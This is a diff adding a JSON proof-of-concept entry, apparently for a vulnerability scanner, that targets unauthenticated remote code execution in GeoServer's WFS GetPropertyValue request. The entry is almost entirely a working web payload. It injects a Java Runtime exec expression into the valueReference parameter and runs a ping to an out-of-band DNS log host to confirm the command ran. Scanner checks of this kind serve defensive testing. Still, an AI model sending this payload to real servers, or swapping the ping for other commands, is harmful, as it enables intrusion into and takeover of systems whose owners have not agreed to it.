@@ -1,0 +1,18 @@
+{
+	"name":"GeoServer属性名表达式前台代码执行",
+	"tag":"geoserver",
+	"type":"exec",
+	"poc":{
+		"pocGet":"/geoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'ping%20-nc%201%20{{dnslog}}')",
+		"header":{
+			"Accept":" */*",
+			"Cache-Control":" max-age=0",
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.118 Safari/537.36",
+			"Connection":" close",
+			"Accept-Encoding":" gzip, deflate, br",
+			"Accept-Language":" en-US;q=0.9,en;q=0.8"
+		},
+		"status_code":"200,400",
+		"pattern":"(xml)"
+	}
+}
